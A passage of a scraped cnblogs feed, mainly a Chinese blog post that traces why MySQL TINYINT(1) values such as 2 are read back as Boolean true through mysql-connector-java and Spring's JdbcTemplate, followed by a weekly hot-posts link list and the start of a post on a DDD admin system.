href=\"https://dev.mysql.com/doc/refman/8.0/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\">整数类型</a>有如下介绍</p>\n<div align=\"center\"><img alt=\"整数类型\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230116-563676929.png\" /></div>\n<p>除了 <code>TINYINT</code>，MySQL 还拓展出了 <code>MEDIUMINT</code> 和 <code>BIGINT</code>，这些都不是 SQL 标准整数类型，在做不同库数据迁移的时候需要考虑这些点</p>\n<blockquote>\n<p>标准 SQL，便于迁移；做表设计的时候，尽量用 SQL 标准数据类型</p>\n</blockquote>\n<p>TINYINT 存储空间占 <strong>1</strong> 字节，有符号的值范围是 -128 到 127，无符号的值范围是 0 到 255</p>\n<p>TINYINT 的基本介绍已经完成，下面开始实操环节，开始之前我先问你们一个问题</p>\n<blockquote>\n<p>在实际项目中，你们一般用 TINYINT 存什么 ？</p>\n</blockquote>\n<p>是不是用来存枚举值？例如这样</p>\n<pre><code class=\"language-sql\">`exec_status` TINYINT DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止'\n</code></pre>\n<p>甚至在枚举值少的时候，会使用 <code>TINYINT(1)</code>，对不对？重点来了</p>\n<div align=\"center\"><img alt=\"640 (8)\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229648-1266766793.jpg\" /></div>\n<p>TINYINT(1) 中的 <code>1</code> 表示什么？很多小伙伴会理所当然的回答道：<strong>数值范围</strong>，TINYINT(1) 表示的是数值范围是 -9 到 9，或者 0 ~ 9</p>\n<p>对不对呢？我们验证下就知道了。基于 MySQL 8.0.31，我们创建表</p>\n<pre><code class=\"language-sql\">CREATE TABLE `tbl_qsl_job` (\n  `id` int NOT NULL COMMENT '主键',\n  `exec_status` tinyint(1) DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n</code></pre>\n<p>插入一条记录</p>\n<pre><code class=\"language-sql\">INSERT INTO tbl_qsl_job(id, exec_status) VALUES(1, 12);\n</code></pre>\n<p>结果会怎么样，超出范围报错？</p>\n<p>实际是插入成功</p>\n<div align=\"center\"><img alt=\"tinyint1_插入12成功\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229673-110950449.png\" /></div>\n<p>道心是不是碎了一地？</p>\n<div align=\"center\"><img alt=\"掀桌子\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229763-87845519.png\" /></div>\n<p>给你们 10 秒钟，收拾下破碎的道心；收拾好了之后我们一起看看官方说明：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/numeric-type-attributes.html\" rel=\"noopener nofollow\" target=\"_blank\">Numeric Type Attributes</a></p>\n<blockquote>\n<p>MySQL supports an extension for optionally specifying the display width of integer data types in parentheses following the base keyword for the type. For example, <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>INT(4)</code></a> specifies an <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>INT</code></a> with a display width of four digits. This optional display width may be used by applications to display integer values having a width less than the width specified for the column by left-padding them with spaces. (That is, this width is present in the metadata returned with result sets. Whether it is used is up to the application.)</p>\n<p>The display width does <em>not</em> constrain the range of values that can be stored in the column. Nor does it prevent values wider than the column display width from being displayed correctly. For example, a column specified as <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>SMALLINT(3)</code></a> has the usual <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>SMALLINT</code></a> range of <code>-32768</code> to <code>32767</code>, and values outside the range permitted by three digits are displayed in full using more than three digits.</p>\n</blockquote>\n<p>相信你们都能看懂，INT(n) 中的 n 表示的是显示宽度，INT(4) 表示的是显示宽度为四位数的 INT。应用程序可以采用左填充空格的方式来填充宽度不够列指定宽度的整数值（也就是说，此宽度会作为结果集的元数据返回，是否使用取决于应用程序）</p>\n<p>显示宽度不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值。例如，SMALLINT(3) 类型的列的存数范围与 SMALLINT 一样，也是 32768 到 32767，超出三位数的值会完整显示</p>\n<p>关于整数类型显示宽度，我们可以进行如下总结</p>\n<blockquote>\n<p>类型后面的 n，是显示宽度，表示显示时最少占 n 个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值，</p>\n<p>显示宽度会作为结果集的元数据返回，是否使用取决于应用程序（这个伏笔，后面会呼应，值得我们留意）</p>\n</blockquote>\n<h2 id=\"2-变-true\">2 变 true</h2>\n<p>我们把 tbl_qsl_job 中 id = 1 的记录的状态改成 2（因为没有枚举值 12）</p>\n<pre><code class=\"language-sql\">UPDATE tbl_qsl_job SET exec_status = 2 WHERE id = 1;\n</code></pre>\n<p>基于 <code>SpringBoot 2.7.18</code>、<code>spring-jdbc 5.3.31 </code>、<code>HikariCP 4.0.3</code>、<code>mysql-connector-java 8.0.25 </code> 构建查询</p>\n<pre><code class=\"language-java\">package com.qsl;\n\nimport org.junit.jupiter.api.Test;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.jdbc.support.rowset.SqlRowSet;\nimport org.springframework.jdbc.support.rowset.SqlRowSetMetaData;\n\nimport javax.annotation.Resource;\n\n/**\n * @author youzb\n */\n@SpringBootTest(classes = Application.class)\npublic class QslJobTest {\n\n    @Resource\n    private JdbcTemplate jdbcTemplate;\n\n    @Test\n    public void getByJdbcTemplate() {\n        SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet(\"SELECT * FROM tbl_qsl_job WHERE id = 1\");\n        SqlRowSetMetaData metaData = sqlRowSet.getMetaData();\n        while (sqlRowSet.next()) {\n            for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {\n                System.out.print(sqlRowSet.getObject(i) + \" \");\n            }\n            System.out.println();\n        }\n    }\n}\n</code></pre>\n<p>你们觉得执行结果是怎样的，是不是 <code>1 2</code> 呢</p>\n<div align=\"center\"><img alt=\"2变true\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230065-2086643304.png\" /></div>\n<p>可以看到，结果并不是 <code>1 2</code>，而是 <code>1 true</code>，是不是有点懵？</p>\n<blockquote>\n<p>明明数据存的是 2，为什么查出来结果是 true？</p>\n</blockquote>\n<div align=\"center\"><img alt=\"懵\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230105-1018176054.png\" width=\"200px\" /></div>\n<p>首先我们可以确定的是，数据库存储的值是没问题的，因为通过 <code>navicat</code> 查到的结果是 2（也说明 navicat 没有对这个值做特殊转换）</p>\n<div align=\"center\"><img alt=\"数据库中值是2\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-777704073.png\" /></div>\n<p>回到我们的程序，数据库中的 2 到程序控制台的 true，经过了那些环节，我们是不是能整理出来？</p>\n<div align=\"center\"><img alt=\"数据流转\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229966-212214453.png\" /></div>\n<p>数据库我们已经确定没问题了，至于是 <code>mysql-connector-java 8.0.25</code>、<code>HikariCP 4.0.3</code>、<code>spring-jdbc 5.3.31</code> 谁做了特殊处理，需要我们进一步排查了；最直接的方式就是 <code>Debug</code> 嘛，断点我已经替你们打好</p>\n<div align=\"center\"><img alt=\"断点debug\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-1870125991.png\" /></div>\n<p>此时到了 MySQL JDBC 驱动里面，我们来看一下 <code>this.results</code> 的信息，有几个点值得我们重点关注下</p>\n<ol>\n<li>\n<p>连接元信息</p>\n<div align=\"center\"><img alt=\"连接元信息\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229967-754344306.png\" /></div>\n<p>我们配置的连接 url 是</p>\n<pre><code class=\"language-yaml\">spring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC\n</code></pre>\n<p>并未设置 <code>tinyint1isBit</code> 值，所以其值 true 是 <code>mysql-connector-java 8.0.25</code> 给的默认值</p>\n</li>\n<li>\n<p>列元信息</p>\n<div align=\"center\"><img alt=\"列元信息\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230080-823708694.png\" /></div>\n<p>可以看到，字段 exec_status 的 length = 1，这个 length 表示什么呢，因为列 exec_status 的类型是整数类型，所以这个 length 是不是就是 <code>显示宽度</code> ？不然还能代表什么？</p>\n<p>最重要的来了，<code>mysqlType</code> 的 <code>name</code> 是 <code>BIT</code></p>\n<div align=\"center\"><img alt=\"mysqltype_bit\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229818-885124704.png\" /></div>\n<p>也就是说，mysql-connector-java 8.0.25 把 TINYINT(1) 解析成了 MysqlType.BIT，对应的 JAVA 类型就是 <code>Boolean</code></p>\n</li>\n</ol>\n<p>既然 exec_status 的 JAVA 类型被解析成了 Boolean，其值 2 也就被解析成 true 了，所以标题的答案是不是就清楚了</p>\n<blockquote>\n<p>mysql-connector-java 8.0.25 默认情况下，把 TINYINT(1) 解析成 JAVA 的 Boolean</p>\n</blockquote>\n<p>问题又来了，mysql-connector-java 8.0.25 对 TINYINT 的解析逻辑是怎样的呢？我们跟下源码就知道了</p>\n<div align=\"center\"><img alt=\"mysqlType赋值逻辑\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230115-2024493590.png\" /></div>\n<p>我们先定位到 <code>com.mysql.cj.protocol.a.ColumnDefinitionReader</code> 的 180 行，然后往上找到 <code>mysqlType</code> 赋值的地方（ColumnDefinitionReade 134 行）</p>\n<pre><code class=\"language-java\">MysqlType mysqlType = NativeProtocol.findMysqlType(this.protocol.getPropertySet(), colType, colFlag, colLength, tableName, originalTableName,\n                collationIndex, encoding);\n</code></pre>\n<p>跟进 NativeProtocol.findMysqlType，我们能看到这样一段代码</p>\n<div align=\"center\"><img alt=\"tinyint赋值逻辑\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229886-1256879629.png\" /></div>\n<p>第一个 if，我们分几部分解析下</p>\n<ol>\n<li>\n<p>isUnsigned</p>\n<p>表示是否无符号，建表的时候，exec_status 并未明确指定 <code>UNSIGNED</code>，所以是有符号的，那么 isUnsigned 值是 false，取反则是 true</p>\n</li>\n<li>\n<p>length</p>\n<p>表字段的显示宽度，也就是 TINYINT(1) 中的 1，所以 length == 1 的结果是 true</p>\n</li>\n<li>\n<p>tinyInt1isBit</p>\n<p>mysql-connector-java 8.0.25 的 <code>PropertyDefinitions</code> 会静态初始化很多属性默认值，其中就包括 tinyInt1isBit</p>\n<div align=\"center\"><img alt=\"tinyInt1isBit默认值\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230030-1104270104.png\" /></div>\n<p>tinyInt1isBit 的默认值是 true</p>\n<p>如果我们在数据库连接 url 中增加 <code>tinyInt1isBit=false</code></p>\n<pre><code class=\"language-yaml\">spring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC&amp;tinyInt1isBit=false\n</code></pre>\n<p>那么配置值会覆盖默认值</p>\n<div align=\"center\"><img alt=\"tinyInt1isBit值覆盖\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230276-1204340058.png\" /></div>\n<pre><code class=\"language-java\">setValueInternal(extractedValue, exceptionInterceptor);\nthis.initialValue = this.value;\n</code></pre>\n<p>这两行会分别将 <code>value</code> 和 <code>initialValue</code> 设置成 <code>false</code></p>\n<p>回到 url 未配置 tinyInt1isBit 的情况，tinyInt1isBit 的值是默认值 true</p>\n</li>\n<li>\n<p>内嵌 if 的 transformedBitIsBoolean</p>\n<p>在分析 tinyInt1isBit 默认值的时候，也红框框住过 transformedBitIsBoolean 的默认值，是 false；没注意的小伙伴，可以往上翻一翻</p>\n</li>\n</ol>\n<p>所以 NativeProtocol.findMysqlType 的返回值是 <code>MysqlType.BIT</code>。如果 length &gt; 1，那么返回的则是 <code>MysqlType.TINYINT_UNSIGNED</code> 或 <code>MysqlType.TINYINT</code></p>\n<p>自此，来龙去脉是不是清楚呢？</p>\n<h2 id=\"问题处理\">问题处理</h2>\n<p>既然已经找到问题原因，那么处理方式也就清晰了，有如下几种</p>\n<ol>\n<li>\n<p>url 中配置 tinyInt1isBit=false</p>\n<p>这个会全局生效，有些需要将 TINYINT(1) 映射成 Boolean 的情况，会出问题</p>\n<p>老项目不推荐增加该配置，除非确定整个项目中没有 TINYINT(1) 映射成 Boolean 的情况</p>\n<p>新项目的话，可以增加该配置</p>\n</li>\n<li>\n<p>字段类型调整成无符号</p>\n<p>增加 <code>UNSIGNED</code> 修饰，例如</p>\n<pre><code class=\"language-sql\">`exec_status` tinyint(1) unsigned DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止',\n</code></pre>\n<p>但有个前提，枚举值不能出现负数</p>\n</li>\n<li>\n<p>调大字段类型显示宽度</p>\n<p>直接使用 TINYINT(4) 或 TINYINT</p>\n</li>\n</ol>\n<h2 id=\"举一反三\">举一反三</h2>\n<p>既然是 mysql-connector-java 8.0.25 做了默认值的处理，那么 MyBatis-Plus 查的结果是不是也是将 2 处理成 true 呢？我们试一下就知道了，引入 MyBatis-Plus 3.5.7，测试代码很简单</p>\n<pre><code class=\"language-java\">@TableName(\"tbl_qsl_job\")\npublic class QslJob {\n\n    private Integer id;\n    private Integer execStatus;\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public Integer getExecStatus() {\n        return execStatus;\n    }\n\n    public void setExecStatus(Integer execStatus) {\n        this.execStatus = execStatus;\n    }\n}\n\n\t@Resource\n    private QslJobDao qslJobDao;\n    \n    @Test\n    public void testMybatisPlus() {\n        QslJob qslJob = qslJobDao.selectById(1);\n        System.out.println(qslJob.getId() + \" \" + qslJob.getExecStatus());\n    }\n</code></pre>\n<p>你们觉得执行结果是怎样的，报错？输出 1 true？还是输出 1 2？执行下就知道了</p>\n<div align=\"center\"><img alt=\"tinyint(1)_mybatis-plus\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229833-1537452094.png\" /></div>\n<p>查询结果正常！</p>\n<p>按前面的分析，mysql-connector-java 8.0.25 返回 exec_status 的值是 true，Boolean 强转 Integer 会报错，即使不报错，结果也应该是 1（0 = false，1 = true）嘛，怎么会是 2 呢？</p>\n<div align=\"center\"><img alt=\"好难 不该学编程的\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229819-259112532.jpg\" /></div>\n<p>Debug 下你们就明白了</p>\n<div align=\"center\"><img alt=\"mybatis_getInt\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230380-1646506667.png\" /></div>\n<p>Mybatis 需要将 mysql-connector-java 8.0.25 查到的 ResultSet 映射成 QslJob，就需要用到类型处理器；QslJob 实体的 execStatus 是 Integer 类型的，那肯定用 IntegerTypeHandler 进行处理嘛，自然而然就用到 <code>rs.getInt</code> ，查到的结果自然就是 2 了。</p>\n<p>我们再回过头去看 <code>SqlRowSet</code>，如果我们用 sqlRowSet.getInt 替换 sqlRowSet.getObject，是不是就行了？</p>\n<pre><code class=\"language-java\">@Test\npublic void getByJdbcTemplate() {\n    SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet(\"SELECT * FROM tbl_qsl_job WHERE id = 1\");\n    SqlRowSetMetaData metaData = sqlRowSet.getMetaData();\n    while (sqlRowSet.next()) {\n        for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {\n            System.out.print(sqlRowSet.getInt(i) + \" \");\n        }\n        System.out.println();\n    }\n}\n</code></pre>\n<p>运行下，我们会发现报错了</p>\n<div align=\"center\"><img alt=\"getInt报\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230281-1107795933.png\" /></div>\n<p>这又是为什么？</p>\n<p>原因在 JdbcTemplate 的数据提取</p>\n<div align=\"center\"><img alt=\"extractData\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230041-1506294441.png\" /></div>\n<p>我们对 rs 进行一下 Evaluate，结果如下</p>\n<div align=\"center\"><img alt=\"rs_evaluate\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229893-1587179875.png\" /></div>\n<p>此时 rs.getInt 能正常获取到 2，这说明什么？</p>\n<blockquote>\n<p>mysql-connector-java 8.0.25 虽然把 TINYINT(1) 映射成了 JAVA 的 Boolean，但其查到的 ResultSet 中的数据仍是与数据库中数据一致的原始数据</p>\n<p>HikariCP 4.0.3 也并未对原始数据做转换处理</p>\n</blockquote>\n<p>我们继续跟进 rse.extractData(rs)，跟进两层会来到关键点</p>\n<div align=\"center\"><img alt=\"cachedRowSet\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230333-1252826137.png\" /></div>\n<p>rowSet.populate(rs) 会把 ResultSet rs 中的数据填充到 CachedRowSetImpl 的 <code>rvh</code> 中</p>\n<div align=\"center\"><img alt=\"rhv\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230242-1871321000.png\" /></div>\n<p>我们接着跟进 sqlRowSet.getInt(i)，答案即将揭晓</p>\n<div align=\"center\"><img alt=\"getInt_error\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229879-213147928.png\" /></div>\n<p>红框框住是不是就会抛异常了？我们继续跟进 this.getCurrentRow，会看到我们刚刚讲到的 <code>rvh</code></p>\n<pre><code class=\"language-java\">protected BaseRow getCurrentRow() {\n    return (BaseRow)(this.onInsertRow ? this.insertRow : (BaseRow)((BaseRow)this.rvh.get(this.cursorPos - 1)));\n}\n</code></pre>\n<p>是不是就呼应上了？这里有两个呼应</p>\n<ol>\n<li>\n<p>显示宽度</p>\n<p>前面已经讲到，显示宽度会作为结果集的元数据返回，是否使用取决于应用程序</p>\n<p>spring-jdbc 的 SqlRowSetResultSetExtractor#createSqlRowSet 方法用到了 CachedRowSetImpl#populate，在进行数据填充的过程中，会调用</p>\n <div align=\"center\"><img alt=\"调用myql驱动的getObject\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229943-1349522055.png\" /></div>\n<p>mysql-connector-java 8.0.25 的 ResultSetImpl#getObject(int) 方法</p>\n <div align=\"center\"><img alt=\"BIT处理\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230095-1344646817.png\" /></div>\n<p>是不是相当于用到了显示宽度？</p>\n</li>\n<li>\n<p>rvh</p>\n<p>CachedRowSetImpl#populate 方法，将数据填充到了 Vector rvh 中<p></p>\n<p>而我们写的代码 sqlRowSet.getInt(i) 是从这个 rvh 中获取的</p>\n\n\n<p>所以，归根结底是 <strong>spring-jdbc 将 ResultSet 处理成 CachedRowSetImpl 的机制，我们没有遵循，才会出现 2 变 true 这种意料之外的结果</strong></p>\n<p>SQL Server 的 tinyint 会不会有类似问题呢？我可以肯定的告诉你们，目前不会有，因为 SQL Server 的 tinyint 没有显示宽度一说，就是固定的 <code>tinyint</code>，不支持 <code>tinyint(n)</code>，至于未来是否支持，未来再说嘛</p>\n<h2 id=\"总结\">总结</h2>\n<ol>\n<li>\n<p>MySQL 整数类型后面的 n 是显示宽度，表示显示时最少占 n 个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值</p>\n</li>\n<li>\n<p>MySQL 会把显示宽度作为结果集的元数据返回，所以 mysql-connector-java 8.0.25 能获取到</p>\n</li>\n<li>\n<p>mysql-connector-java 8.0.25 虽然有显示宽度，也提供了间接用到显示宽度的getObject方法，但其 ResultSet 中的数据与数据库中的数据是一致的</p>\n<p>至于上层应用如何使用 mysql-connector-java 8.0.25 中的元数据，由上层应用决定；spring-jdbc 就是上层应用之一、MyBatis 也是</p>\n</li>\n<li>\n<p>spring-jdbc 的 JdbcTemplate.queryForRowSet 会间接使用显示宽度，而 Mybatis 不会，MyBatis 有类型处理器</p>\n</li>\n<li>\n<p>如何避免标题中的问题，文中的 <strong>问题处理</strong> 章节已经说明，推荐第三种方式</p>\n<blockquote>\n<p>不使用 TINYINT(1)，直接使用 TINYINT(4) 或 TINYINT</p>\n</blockquote>\n</li>\n</ol>\n</p></li></ol>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 08:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/youzhibing\">青石路</a>&nbsp;\n阅读(<span id=\"post_view_count\">130</span>)&nbsp;\n评论(<span id=\"post_comment_count\">4</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "上周热点回顾（1.12-1.18）",
      "link": "https://www.cnblogs.com/cmt/p/19499970",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/cmt/p/19499970\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 08:27\">\n    <span>上周热点回顾（1.12-1.18）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>热点随笔：</p>\n<p> · <a href=\"https://www.cnblogs.com/sdcb/archive/2026/01/15/20261113-big-integer-dotnet-10-vs-java.html\" target=\"_blank\">不服跑个分？.NET 10 大整数计算对阵 Java，结果令人意外</a> (<a href=\"https://www.cnblogs.com/sdcb/\" target=\"_blank\">.NET骚操作</a>) <br />\n · <a href=\"https://www.cnblogs.com/dotnet-org-cn/archive/2026/01/12/19473369.html\" target=\"_blank\">一个高性能的 .NET MQTT 客户端与服务器库</a>\n(<a href=\"https://www.cnblogs.com/dotnet-org-cn/\" target=\"_blank\">中国.NET研究协会</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/zxlh1529/archive/2026/01/14/19480754.html\" target=\"_blank\">新的一年，写给博客园的大家，也写给自己</a>\n(<a href=\"https://www.cnblogs.com/zxlh1529/\" target=\"_blank\">幼儿园技术家</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/SunSpring/archive/2026/01/13/19469874.html\" target=\"_blank\">2025总结篇，忙碌的日子里越过35岁，开启下一个征程</a>\n(<a href=\"https://www.cnblogs.com/SunSpring/\" target=\"_blank\">XSpringSun</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/whuanle/archive/2026/01/12/19469026.html\" target=\"_blank\">万字长文讲解：团队落地 AI 辅助编程和 AI Specs 实战</a>\n(<a href=\"https://www.cnblogs.com/whuanle/\" target=\"_blank\">痴者工良</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/guangzan/archive/2026/01/15/19487446.html\" target=\"_blank\">AI → JSON → UI</a>\n(<a href=\"https://www.cnblogs.com/guangzan/\" target=\"_blank\">guangzan</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/sdcb/archive/2026/01/13/20251203-interleaved-thinking.html\" target=\"_blank\">从 OpenAI 兼容到 Anthropic 崛起：大模型“交错思考”协议的演进与变局</a>\n(<a href=\"https://www.cnblogs.com/sdcb/\" target=\"_blank\">.NET骚操作</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/lichengxiao/archive/2026/01/15/19485897.html\" target=\"_blank\">新的旅程</a>\n(<a href=\"https://www.cnblogs.com/lichengxiao/\" target=\"_blank\">熬夜不早睡</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/Can-daydayup/archive/2026/01/12/19470057.html\" target=\"_blank\">让 WinForm.NET 再次伟大！一个专门设计用于帮助 WinForms 应用程序迁移到 Blazor WASM 平台的项目</a>\n(<a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/lijinhuaboke/archive/2026/01/14/19457121.html\" target=\"_blank\">高德地图实现实时轨迹展示</a>\n(<a href=\"https://www.cnblogs.com/lijinhuaboke/\" target=\"_blank\">此颜差矣。</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/Can-daydayup/archive/2026/01/13/19479370.html\" target=\"_blank\">C#/.NET/.NET Core技术前沿周刊 | 第 65 期（2026年1.1-1.11）</a>\n(<a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/MeteorSeed/archive/2026/01/12/19460575.html\" target=\"_blank\">【译】使用 Visual Studio 2026 简化您的 Git 工作流程</a>\n(<a href=\"https://www.cnblogs.com/MeteorSeed/\" target=\"_blank\">MeteorSeed</a>)                    <br />\n            </p>\n<p>热点新闻：</p>\n<p>\n · <a href=\"https://news.cnblogs.com/n/812864/\" target=\"_blank\">因AI做的太好陷绝境！收入暴降80%，裁员75%，只剩6个月续命，下一个是谁？</a><br />\n · <a href=\"https://news.cnblogs.com/n/813046/\" target=\"_blank\">5行代码，逼疯整个硅谷！澳洲放羊大叔，捅开AI编程奇点</a><br />\n · <a href=\"https://news.cnblogs.com/n/812874/\" target=\"_blank\">Linux祖师爷真香现场！曾嘲讽AI编程是垃圾，如今亲自下场氛围编程</a><br />\n · <a href=\"https://news.cnblogs.com/n/812866/\" target=\"_blank\">年薪70万跌至几千块！第一批被AI取代的人类出现了</a><br />\n · <a href=\"https://news.cnblogs.com/n/812716/\" target=\"_blank\">马斯克宣布“X将在7天内公开所有算法”，包括推荐算法，以后每四周1次</a><br />\n · <a href=\"https://news.cnblogs.com/n/813044/\" target=\"_blank\">Digg 重新上线</a><br />\n · <a href=\"https://news.cnblogs.com/n/812977/\" target=\"_blank\">实测：千问App接入“阿里全家桶”，可以点外卖、订车票了</a><br />\n · <a href=\"https://news.cnblogs.com/n/812836/\" target=\"_blank\">内存暴涨10倍，手机电脑直呼买不起？中国厂商的机会，这次真的来了</a><br />\n · <a href=\"https://news.cnblogs.com/n/813054/\" target=\"_blank\">不得了，这个新技术把视频压缩到了0.02%！</a><br />\n · <a href=\"https://news.cnblogs.com/n/812777/\" target=\"_blank\">携程深夜发离职通知短信，后被澄清为乌龙事件</a><br />\n · <a href=\"https://news.cnblogs.com/n/812851/\" target=\"_blank\">KAN一作刘子鸣回国任教，清华官网盖章认证了</a><br />\n · <a href=\"https://news.cnblogs.com/n/813045/\" target=\"_blank\">被判违法的AI仲裁案，撕开了技术裁员的遮羞布</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 08:27</span>&nbsp;\n<a href=\"https://www.cnblogs.com/cmt\">博客园团队</a>&nbsp;\n阅读(<span id=\"post_view_count\">277</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "基于NetCorePal Cloud Framework的DDD架构管理系统实践",
      "link": "https://www.cnblogs.com/aishangyipiyema/p/19499381",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/aishangyipiyema/p/19499381\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 22:57\">\n    <span>基于NetCorePal Cloud Framework的DDD架构管理系统实践</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"基于netcorepal-cloud-framework的ddd架构管理系统实践\">基于NetCorePal Cloud Framework的DDD架构管理系统实践</h1>\n<p>前段时间在做一个管理系统的项目，想尝试一下DDD架构在实际项目中的应用。经过一番调研，最终选择了NetCorePal Cloud Framework作为基础框架，结合.NET 10和Vue 3搭建了一套完整的前后端分离架构。今天就想和大家分享一下这个项目的架构设计和技术选型，希望能给正在做类似项目的朋友一些参考。</p>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<h2 id=\"项目概述\">项目概述</h2>\n<p>这个项目是一个典型的企业级管理系统，包含了用户、角色、部门等基础功能模块。在技术选型上，采用了目前比较主流的技术栈：</p>\n<p>后端方面，使用.NET 10作为主要框架，配合EF Core做数据访问，FastEndpoints替代传统的Controller，MediatR实现CQRS模式。数据存储支持MySQL、PostgreSQL和SQL Server，消息队列选择了RabbitMQ（通过CAP框架集成），缓存用Redis，还集成了.NET Aspire来做云原生的基础设施管理。</p>\n<p>前端部分基于Vben Admin，这是一个非常优秀的Vue 3 + TypeScript + Vite的管理后台模板，UI组件用的是Ant Design Vue，整体体验不错。</p>\n<h2 id=\"架构设计\">架构设计</h2>\n<h3 id=\"分层架构\">分层架构</h3>\n<p>整个项目采用了经典的三层架构，这个结构应该很多做DDD的朋友都比较熟悉。三层之间的依赖关系是单向的：Web层依赖Infrastructure层，Infrastructure层依赖Domain层，Domain层作为核心，不依赖任何其他层。</p>\n<pre><code>Ncp.Admin\n├── Domain（领域层）\n│   ├── AggregatesModel（聚合模型）\n│   └── DomainEvents（领域事件）\n├── Infrastructure（基础设施层）\n│   ├── EntityConfigurations（实体配置）\n│   └── Repositories（仓储实现）\n└── Web（表现层）\n    ├── Application（应用服务层）\n    │   ├── Commands（命令）\n    │   ├── Queries（查询）\n    │   └── 